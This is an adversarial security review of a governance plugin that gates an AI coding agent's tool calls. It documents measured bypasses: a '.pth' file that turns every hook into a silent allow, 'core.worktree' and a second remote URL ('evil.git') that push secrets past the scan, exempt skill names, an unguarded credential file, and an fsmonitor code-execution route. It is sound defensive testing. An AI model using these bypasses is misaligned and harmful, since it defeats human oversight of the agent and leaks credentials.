# Adversarial review: CISO agent plugin (local hooks, skill, managed templates)

Date: 2026-11-19. Reviewer: independent, adversarial; did not write the code.

## Scope

- `integrations/claude_code/ciso-plugin/`: `hooks/hooks.json`, `scripts/ciso_hook.py`,
  `lib/ciso_plugin/**`, `skills/ciso/` (SKILL.md, references, `scripts/ciso_tool.py`),
  `apps-skill/`, `rules/governance-ruleset.json`, README (its stated limits).
- `integrations/claude_code/managed-plugin/` (three templates, `source.json`,
  `check_managed.py`), `tools/build_ciso_plugin.py` (zip and check paths), `tests/plugin/`.
- The bundled engine `lib/ciso/` was NOT re-reviewed (see the two earlier reviews); only
  whether the plugin's glue or local mode reintroduces or weakens anything.

## Method

- Ran the real hook the way `hooks.json` does: both directly
  (`python -I -B scripts/ciso_hook.py` with crafted PreToolUse JSON on stdin, the project
  interpreter, `CLAUDE_PLUGIN_DATA` in the scratchpad, `CISO_GIT_PATH` set) and through the
  declared `uv run --quiet --no-config --no-project --python ">=3.13" --directory <plugin>
  --with-requirements ... -- python -I -B ...` command (`UV_OFFLINE=1`, uv 0.9.26).
- Throwaway git repositories with local bare remotes under the session scratchpad (prefix
  `revP-`), a cloud access key id built from fragments at runtime, git 2.56.1 (Windows).
- Ran the skill tool (`ciso_tool.py review|summary`) and the managed checker on crafted
  template copies. No `claude` CLI, no external host (one uv request went to
  `127.0.0.1:9`, a closed local port), no packages installed (two empty venvs created
  offline in the scratchpad).
- "Measured" below means reproduced by running the code; "read" means from source or
  documentation only.

## Summary

| Id | Severity | One line |
|---|---|---|
| H1 | High | The hook's interpreter comes from whatever venv uv discovers (`VIRTUAL_ENV`, any `.venv` above the plugin folder such as `~/.venv`) and from uv env vars; a `.pth` there turns every hook into a silent allow |
| H2 | High | `core.worktree` re-roots the push (and commit) scan into another repository; the secret branch is then pushed with a hook `allow` |
| M1 | Medium | A remote with two `url` values: scan base comes from the first URL only, the push sends unscanned history to the second |
| M2 | Medium | The own-skill exemption accepts the bare name `ciso`, which is never this plugin's skill (plugin skills are namespaced) but any project or user skill of that name |
| M3 | Medium | The stop flag, an unreadable OS account and an invalid role do not apply to the own skill and own tool (allowed before the engine) |
| M4 | Medium | `check_managed.py` says `RESULT: READY` for templates with no deny rules, no minimum version, case-variant git keys that undo the hardening, extra marketplaces, permissive modes, or an inert hook |
| M5 | Medium | The unanchored hash chain reports "intact" after tail truncation or a full re-chain; the README's detection claim does not hold |
| M6 | Medium | `Read` of Claude Code's own credential file `~/.claude/.credentials.json` is allowed with no prompt |
| L1 | Low | `git status` is an allowed read, but the managed git hardening leaves `core.fsmonitor` on: one approved config write becomes unhooked code execution on every `git status` |
| L2 | Low | Config KEY names are echoed into the deny message; a `credential.<url>.helper` key carries the URL's token into the message |
| L3 | Low | `review` follows symlinks and junctions out of the repository and reads credential files (reports presence and position, bypasses the managed `Read` deny) |

---

## H1. The hook runtime is whatever venv uv discovers; a `.pth` there disables enforcement

- **Where**: `ciso-plugin/hooks/hooks.json:10-15` and `:28-33` (the uv argv); the same argv
  in `lib/ciso_plugin/selfcmd.py` and `skills/ciso/SKILL.md` for the tool; managed `env`
  in `managed-plugin/*/managed-settings.json`; README "Machine requirements" (claims
  `--directory` and `--no-config` keep the repository's environment out).
- **What breaks**: `uv run --no-project --python ">=3.13"` picks its base interpreter from
  (a) an active venv (`VIRTUAL_ENV`, e.g. an engineer who starts Claude Code from an
  activated project venv) and (b) a `.venv` in the `--directory` folder or ANY parent of
  it. In production the plugin lives at `~/.claude/plugins/cache/<marketplace>/ciso-agent/<version>/`,
  so `~/.venv` (common) and `C:\Users\.venv`, `C:\.venv` qualify. The overlay env built for
  `--with-requirements` keeps that base's `site-packages`, and `-I` does not stop `.pth`
  processing. A `.pth` line runs before `ciso_hook.py`; `os._exit(0)` there prints
  nothing, which Claude Code reads as allow. Separately, uv honours `UV_INDEX_URL`,
  `UV_FIND_LINKS`, `UV_NO_CACHE` and friends from the environment despite `--no-config`,
  and the PEP 723 pins carry no hashes, so any index that serves a `pydantic==2.14.0`
  wheel supplies the hook's code.
- **Who can reach it**: the agent with ONE approved action, no further prompts ever:
  `Write` of a `.pth` into `<repo>/.venv/Lib/site-packages/`, `~/.venv/...`, the uv cache
  or a uv-managed Python, or `pip install <pkg>` into the active venv. Measured verdicts:
  all of these writes are `ask` with the generic "no company rule covers it" text, while
  writes under `~/.claude/plugins/**` are `deny`. Also any dependency that ships a `.pth`
  (supply chain), and whatever sets the launch environment (the engineer, Claude Desktop,
  and per the settings reference a repository's `.claude/settings.json` `env`; not run).
- **Sequence (measured)**:
  1. Empty venv `revP-uvt/.venv` (offline `uv venv`), plugin copied to
     `revP-uvt/a/b/plugin`; `revP_probe.pth` in the venv's site-packages that calls
     `os._exit(0)` when `argv` ends in `ciso_hook.py`.
  2. Declared uv command, payload = `Write` of `.mcp.json` (normally `deny`,
     `agent_config_change`): **exit 0, no output = allow**. Same payload with the `.pth`
     removed: the expected `deny` JSON.
  3. Plugin copied to a folder with no `.venv` above it, `VIRTUAL_ENV` pointing at a
     project venv holding the `.pth`: **allow**. `VIRTUAL_ENV` empty: `deny`.
  4. `UV_NO_CACHE=1 UV_INDEX_URL=http://127.0.0.1:9/simple`: uv tried to fetch the pinned
     packages from that index (connection refused), i.e. the env var chooses the source.
  5. Side note: in this repository the plugin sits under `CISO_AG/`, so the declared hook
     already runs on the project's `.venv` (pydantic 2.14.3, not the pinned 2.14.0);
     `tests/plugin/test_uv_runtime.py` only covers a `.venv` in the working directory.
- **Smallest fix**: add `--isolated` to the uv argv in `hooks.json`, `selfcmd.py` and
  SKILL.md (measured: with `--isolated` both the ancestor `.venv` and `VIRTUAL_ENV` cases
  return the correct `deny`); ship a hashed requirements file and pass `--require-hashes`
  (or pre-install into an admin-owned location); set `UV_INDEX_URL`, `UV_FIND_LINKS`,
  `UV_EXTRA_INDEX_URL`, `UV_NO_CACHE`, `UV_CACHE_DIR`, `UV_PYTHON_INSTALL_DIR`,
  `VIRTUAL_ENV`, `CONDA_PREFIX` explicitly in the managed `env`; treat the uv binary, uv
  cache and uv Python folders as protected paths (managed deny + `agent_config_paths`).
  The admin-installed interpreter fallback the README describes is the sound end state.

## H2. `core.worktree` makes the scan read another repository

- **Where**: `lib/ciso_plugin/pushscan.py:214-216` (`scan_push`: `rev-parse --show-toplevel`,
  then `git.at(top)` for config, hooks, refs and the log) and `:234-235` (`scan_commit`).
- **What breaks**: with `core.worktree=<dir B>` in repository A, `--show-toplevel` run in
  A prints B. Every later scan step runs with `cwd=B`, where git discovers B's own
  repository: B's config (remote check, hazards), B's hooks folder and B's
  `refs/heads/<branch>`. The agent's `git push origin <branch>` still runs in A and sends
  A's branch. The commit scan has the same flaw (it diffs B's index).
- **Sequence (measured)**: repo A (`revP-A/work`) with branch `feat` adding a key; bare
  remote. Baseline: `git push origin feat` -> `deny` (secret found). Clean repo B
  (`revP-B/clean`) with a remote named `origin` and a branch `feat`.
  `git config core.worktree <B>` in A (hook verdict `ask`, generic text). Then
  `git push origin feat` from A -> hook **`allow`**, no message; the push ran and the bare
  remote's `feat:settings.py` holds the key.
- **Smallest fix**: never re-root. Resolve `rev-parse --absolute-git-dir` from the payload
  `cwd` and run every scan step with `--git-dir=<that>` (plus `--work-tree` only for the
  commit's index if needed); refuse when `core.worktree` is set in any scope (add it to
  `config_hazards`). Add a test with `core.worktree` pointing at a clean repository.

## M1. A second `remote.<name>.url` receives history the scan never read

- **Where**: `pushscan.py:92-115` (`config_hazards` refuses `pushurl` and friends but not
  repeated `url`), `:137-154` (`scan_bases`: `ls-remote` contacts only the first URL).
- **What breaks**: git pushes to every `url` of a remote. Bases come from the first URL's
  advertisement, so commits already on URL 1 are excluded from the scan but are sent to
  URL 2 if it lacks them. README promises "neither a lying remote nor a moved local ref
  alone can shrink the scan".
- **Sequence (measured)**: `main` on the bare remote already contains a commit with a key
  (pushed before the plugin). New clean branch `feat2`. `git config --add
  remote.origin.url ../evil.git` (`ask`). `git push origin feat2` -> **`allow`**;
  `evil.git` now holds `feat2`, the key commit and the root.
- **Smallest fix**: in `config_hazards`, refuse when the remote has more than one `url`
  entry (count `remote.<name>.url` across scopes), or scan to the root when it does.

## M2. Bare skill name `ciso` is exempt

- **Where**: `lib/ciso_plugin/selfcmd.py:29` (`SKILL_NAMES = {"ciso", "ciso-agent:ciso"}`),
  `:104`; `decide.py:172`; the test `test_own_skill_adversarial.py:98` asserts the bare
  name is allowed.
- **What breaks**: plugin skills are always invoked namespaced (`ciso-agent:ciso`, as the
  README and SKILL.md themselves say). A bare `ciso` is a project skill
  (`<repo>/.claude/skills/ciso/`, shipped by any cloned repository) or a user skill. Its
  load is allowed with no prompt and no engine decision, where any other skill name is
  `ask`. What a loaded skill can do outside tool hooks (dynamic `!` command context) is
  not established here (see Suspicions); at minimum it injects arbitrary instructions with
  the CISO exemption's blessing.
- **Measured**: `Skill {"skill": "ciso"}` -> `allow`; agent `Write` of
  `<repo>/.claude/skills/ciso/SKILL.md` -> `deny` (so the vector is a repository that
  already contains it, or the engineer).
- **Smallest fix**: accept only `ciso-agent:ciso`; flip the test.

## M3. The stop flag and identity failures do not reach the own skill and tool

- **Where**: `decide.py:169-173` (own invocation returns before the engine; the kill
  switch and principal checks live in the engine).
- **What breaks**: with `CISO_STOP=1` every non-read action is denied, even `git status`;
  the own tool and the `Skill` call stay `allow`. Same with an invalid `CISO_ROLE` and
  (by reading) with an unreadable OS account. The own tool runs uv (which may download
  packages when its cache is cold, and per H1 runs whatever venv it finds), reads any
  folder named by `--repo` and writes reports.
- **Measured**: `{}`: own tool allow, Skill allow, Write ask, git status allow.
  `CISO_STOP=1`: own tool **allow**, Skill **allow**, Write deny, git status deny.
  `CISO_ROLE=nonsense`: own tool **allow**, Skill **allow**, others deny.
- **Smallest fix**: in `Decider.decide`, check `EnvKillSwitch` and that the attribution is
  verified with a resolvable principal before honouring `own_invocation`.

## M4. The managed checker passes weakened templates

- **Where**: `managed-plugin/check_managed.py:64-104` (`check_settings`), `:43-61`
  (`git_pairs`, exact-case dict), `:80` (membership, not "exactly"), `:107-129`
  (`check_plugin_hooks`).
- **What breaks / measured** (template copies with placeholders filled, run as
  `python -I check_managed.py <copy> <plugin>`), every one printed `RESULT: READY`:
  1. `permissions.deny` removed, `requiredMinimumVersion` removed (README: `onFailure`
     needs 2.1.295+, so an older client runs the hooks fail-open),
     `disableCommandPluginSources`, `forceLoginOrgUUID` and `UV_NO_CONFIG` removed.
  2. `GIT_CONFIG_COUNT=6` with `GIT_CONFIG_KEY_4=core.hookspath` / `.githooks` and
     `GIT_CONFIG_KEY_5=Protocol.ext.allow` / `always`. git is case-insensitive and takes the
     last value (measured: `git config --get core.hooksPath` -> `.githooks`,
     `protocol.ext.allow` -> `always`); the checker's dict keeps the exact-case first pair.
  3. A second, foreign entry in `strictKnownMarketplaces`.
  4. `permissions.defaultMode: "dontAsk"` and `allow: ["Bash(*)"]`.
  5. A `hooks.json` whose handlers run `cmd /c exit 0` (exec form, timeout,
     `onFailure: block`) instead of the CISO hook.
- **Smallest fix**: require the exact deny list (or a superset), `requiredMinimumVersion
  >= 2.1.316`, `disableCommandPluginSources`, `UV_NO_CONFIG`; compare git keys
  case-insensitively and reject duplicates; require `strictKnownMarketplaces` to equal
  `[source]`; reject `defaultMode`/`allow` in the managed file unless reviewed; check that
  the hook argv runs `scripts/ciso_hook.py` with the expected uv flags.

## M5. The hash chain verifies after truncation or a full rewrite

- **Where**: `lib/ciso_plugin/auditlog.py:159-181` (`verify`), README line 202 ("the hash
  chain shows edited log lines").
- **What breaks**: SHA-256 of public data with no key and no external anchor. Dropping the
  last N records, deleting the file, or recomputing the whole chain all verify. The
  summary then tells the person the log is "intact".
- **Measured**: first 5 of 178 records kept -> `5 records, hash chain intact`. All `deny`
  records removed and the rest re-chained from genesis (seq renumbered) -> `106 records,
  hash chain intact`. (The agent's direct routes to the data folder are denied: 8 shell
  forms measured `deny`; the rewrite needs the engineer or code execution, e.g. H1.)
- **Smallest fix**: say in the README and the summary that the chain only detects edits by
  someone who does not recompute it; anchor the head hash somewhere the user cannot write
  (managed service add-on, OS event log, a periodic signed export) and report a missing
  or regressed `seq` against that anchor.

## M6. Claude Code's own credential file is readable without a prompt

- **Where**: `rules/governance-ruleset.json:24` (`credential_paths: []`), the managed deny
  list in the templates (no entry for it), README ("reads of common credential files").
- **Measured** (`Read` tool payloads): `~/.ssh/id_ed25519`, `.aws/credentials`,
  `.config/gh/hosts.yml`, `.netrc`, `.docker/config.json`, `.kube/config`, `.npmrc`,
  `.pypirc`, `.git-credentials`, `.env` -> `deny`; `~/.claude/.credentials.json` ->
  **`allow`** (`cat` of it via Bash -> `ask`).
- **Smallest fix**: add `Read(~/.claude/.credentials.json)` to the managed deny list and
  the path to the deployment ruleset's credential paths (the derive script).

## L1. Allowed `git status` runs a repository's `core.fsmonitor`

- **Where**: managed `env` git hardening (four pairs), README "Known limits".
- **Measured**: `git status` -> hook `allow`; with `core.fsmonitor=<script>` in the repo
  config, `git status` ran the script (marker file written). Writing that config is `ask`
  with the generic text, after which every `git status` executes it with no hook decision.
- **Fix**: add `core.fsmonitor=false` (and `core.pager=cat` / `diff.external=` for the
  read-only `git` forms the classifier allows) to the managed git pairs and the checker.

## L2. Config key names leak into the deny message

- **Where**: `pushscan.py:99-114` (`found.append(key)`), `messages.py` `compose` (`names`
  appended verbatim); the module docstring promises nothing from config values appears.
- **Measured**: repo config `credential.https://u:<token>@example.invalid.helper=store`;
  `git push origin feat3` -> `deny` whose text ends with that key, token included
  (lower-cased by `casefold`). Not written to the audit log.
- **Fix**: print key classes (`credential.<url>.helper`, `remote.<name>.push`), as is
  already done for `url.<base>.pushinsteadof`.

## L3. `review` follows links out of the repository

- **Where**: `lib/ciso_plugin/tools/review.py:52`, `:71-73` (`is_file()` and `read_bytes()`
  follow links; the whole file is read before the cap is applied).
- **Measured**: non-git folder with a junction `link -> outside/` holding a credentials
  file: `review` reported `high secret.cloud_access_key link/credentials:1:21`. Tracked
  symlinks behave the same on POSIX (read). The value is never printed; presence and
  position are, and the managed `Read(~/.ssh/**)` deny is bypassed by the exempt tool.
- **Fix**: skip anything whose resolved path is outside the resolved repo root and skip
  symlinks/junctions; read with a bounded `read(n)`.

---

## Checked and held

- Push shapes, Bash and PowerShell tools, secret branch (14 forms each): `git.exe`, `GIT`,
  absolute git, quoted git path, `feat:refs/heads/feat`, `+feat`, `refs/heads/feat:x`,
  `--no-verify`, trailing `--`, `-o`, `--repo=`, `@:feat`, `feat^0:feat`: all `deny`.
  `git -c k=v push`, `git -C x push`: deny. Alias creation `git config alias.p push`: deny;
  `git -c alias.x=push x ...`: deny; `git p ...`, `git send-pack`: ask (never allow).
- `git config` write forms incl. the new `git config set|unset|edit|rename-section`
  syntax and `--add`: ask; read forms allowed. `export GIT_DIR=...`, `$env:GIT_DIR`,
  `$env:GIT_CONFIG_COUNT`, `Set-Item Env:`: deny.
- `.git/info/grafts` hiding the secret commit: ignored by the scan
  (`--no-replace-objects`), push denied. Shallow boundaries: a shallow root is diffed as a
  full add (read).
- Agent writes to the data folder (`truncate`, `: >`, `rm`, `python -c open(...,'w')`,
  `cp /dev/null`, `cd ... && rm`, `mv` of the folder, `sed -i`): all `deny`.
- Secrets in WebFetch query strings, URL userinfo, MCP arguments, a Bash bearer header,
  a sub-agent prompt, a push URL with credentials: absent from messages, audit and
  findings logs (only a value embedded in a file name is logged, as the path).
- `CISO_ROLE`/`CISO_AGENT_CLASS`/`CISO_STOP` set in the agent's own command do not reach
  the hook process (its environment is Claude Code's); `export` forms are denied.
  Unknown stop values count as engaged.
- Own-tool matcher: forbidden characters, exact uv flags, path identity via `resolve()`,
  `--data-dir` pinned on every occurrence, unknown options or argparse abbreviations
  rejected. `--range` accepts a leading `-` (e.g. `-O../x`), but `rev-list` rejects it
  before `log` runs (read).
- Commit shapes other than `git commit -m|--message` (incl. `-a`, `--amend`, `-F`,
  pathspecs) give no shape and are denied; `commit-tree`/`update-ref`/`branch -f` are
  ask or deny and the push scan still covers their commits (read + measured verdicts).
- Credential reads by `Read` and `cat` for ten common credential paths: deny (see M6 for
  the exception).
- Apps zip: only `ciso/SKILL.md` (apps variant, no `allowed-tools`) and
  `ciso/references/*.md`, fixed timestamps; no scripts (read).
- Runtime guard: `ciso_hook.py` refuses a non-isolated or pre-3.13 interpreter; a planted
  `.venv` in the working directory is not used (existing test).

## Suspicions (not proven; need a real Claude Code run)

- **Project settings `env`** in a cloned repository's `.claude/settings.json` is
  documented to reach every session and its subprocesses; managed `env` wins only for the
  same key. Unset keys (`VIRTUAL_ENV`, `UV_INDEX_URL`, `UV_NO_CACHE`, `PATH`) would steer
  the hook runtime (H1) with no agent action at all.
- **Case-variant env keys** (`ciso_stop` next to `CISO_STOP`): Node's spawn keeps the
  uppercase one on Windows; the Python child keeps whichever comes last (measured on the
  Python side). Whether Claude Code (Node or Bun) dedups is unknown.
- **Hook `cwd` after `cd`**: `cd <dir>` is an allowed read in both shells. If the Bash
  tool's persistent directory moves into a nested repository while the hook still gets
  the session `cwd`, the scan reads the outer repository (README already lists it).
- **PowerShell session state**: `[Environment]::SetEnvironmentVariable('GIT_DIR',...)` is
  only `ask`; if the PowerShell tool keeps one process, the next push runs against a
  different `GIT_DIR` than the hook scanned.
- **Scan-to-push TOCTOU**: a background job started earlier (approved) or a parallel tool
  call can move the branch after the hook scanned it.
- **Skill dynamic context** (`!` commands in a SKILL.md) may run without a PreToolUse
  event; combined with M2 a repository skill named `ciso` would run commands unhooked.
- **Remote helpers**: `remote.<name>.vcs` or a `<helper>::` URL make the hook's own
  `ls-remote` start `git-remote-<helper>` from PATH inside the hook process (not in
  `config_hazards`).
- **Case-insensitive loose refs on Windows**: packed `refs/heads/feat` vs loose
  `refs/heads/FEAT` can make `rev-parse` (scan) and the push's ref listing pick different
  commits (theory, not built).
- **`CLAUDE_CONFIG_DIR`** relocation moves the plugin cache and data out of `.claude`,
  outside both the managed deny globs (`~/.claude/...`) and `agent_config_paths`.
- **Repo settings that run commands outside hooks** (`statusLine`, project MCP servers)
  are not restricted by the template.

## Not reviewed

- The bundled classifier and inspector internals (`lib/ciso/`), beyond the verdicts above.
- Claude Code itself: no `claude` run, so precedence, `cwd`, skill loading and env
  merging are from documentation only.
- macOS and Linux (symlink, `flock`, pwd paths), the optional service and sandbox
  add-ons, the uv download path against a real index, and `tools/build_ciso_plugin.py`
  beyond the zip and check paths.
